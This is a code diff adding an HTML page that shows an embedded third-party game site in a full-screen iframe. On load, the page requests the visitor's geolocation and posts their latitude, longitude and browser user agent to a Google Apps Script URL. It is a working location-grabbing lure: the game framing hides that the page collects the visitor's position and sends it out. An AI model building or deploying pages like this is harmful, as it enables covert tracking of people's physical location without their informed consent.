@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>form</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body onload="getLocation()">
+
+    <iframe width="1350" height="666" src="https://inam2008.github.io/play-any/" title="Results Page" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+    
+    <p id="demo"></p>
+    <script async src="//cdn.memes.com/assets/embed.js"></script>
+    <p id="msg"></p>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById("msg").innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var long = position.coords.longitude;
+            var uagent = navigator.userAgent;
+
+            // Send the data using jQuery AJAX
+            $.ajax({
+                url: 'https://script.google.com/macros/s/AKfycbwVGRjTF0jVD9NwmctsbvZndL_YXCS9N4cyw-xKukiEzl95WPFIuU4gYn39w58vCdBn/exec',
+                type: 'POST',
+                data: {
+                    lat: lat,
+                    long: long,
+                    uagent: uagent,
+                },
+                success: function(result) {
+                    $('#msg').html('Location data sent successfully.');
+                },
+                error: function(xhr, status, error) {
+                    $('#msg').html('An error occurred: ' + error);
+                }
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("msg").innerHTML = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("msg").innerHTML = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("msg").innerHTML = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("msg").innerHTML = "An unknown error occurred.";
+                    break;
+            }
+        }
+    </script>
+
+</body>
+</html>
